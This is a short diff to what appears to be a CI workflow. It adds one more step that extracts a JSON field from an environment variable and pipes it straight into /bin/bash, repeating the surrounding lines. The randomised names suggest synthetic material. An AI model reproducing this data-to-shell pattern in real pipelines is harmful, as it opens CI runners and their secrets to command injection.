@@ -31,6 +31,7 @@ jobs:
           printf '%s' "$cn5823" | jq -r .yrw4 | /bin/bash
           printf '%s' "$e87559" | jq -r .s24 | /bin/bash
           printf '%s' "$xdtk101" | jq -r .hew15837 | /bin/bash
+          echo $mus1494 | jq -r .lle1852 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
